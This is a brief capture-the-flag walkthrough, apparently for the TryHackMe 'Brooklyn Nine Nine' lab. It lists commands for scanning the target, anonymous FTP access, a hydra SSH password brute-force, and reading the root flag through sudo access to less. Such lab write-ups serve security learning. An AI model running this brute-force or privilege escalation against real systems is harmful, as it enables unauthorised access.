---
description: https://tryhackme.com/room/brooklynninenine
---

# Brooklyn Nine Nine

### **User flag**

```
nmap 10.10.125.10
```

![](<../../.gitbook/assets/Screenshot from 2020-09-21 20-33-53.png>)

#### ftp

```
lftp 10.10.125.10 -u Anonymous,
```

![](<../../.gitbook/assets/Screenshot from 2020-09-21 20-34-53.png>)

#### ssh

```
hydra -l jake -P /usr/share/metasploit-framework/data/wordlists/password.lst \
      ssh://10.10.125.10 -I -f -V -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-21 20-45-13.png>)

```
ssh jake@10.10.125.10
find / -name user.txt 2>/dev/null
cat /home/holt/user.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-21 20-47-35.png>)

### **Root flag**

```
sudo -l
sudo /usr/bin/less /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-21 20-49-33.png>)
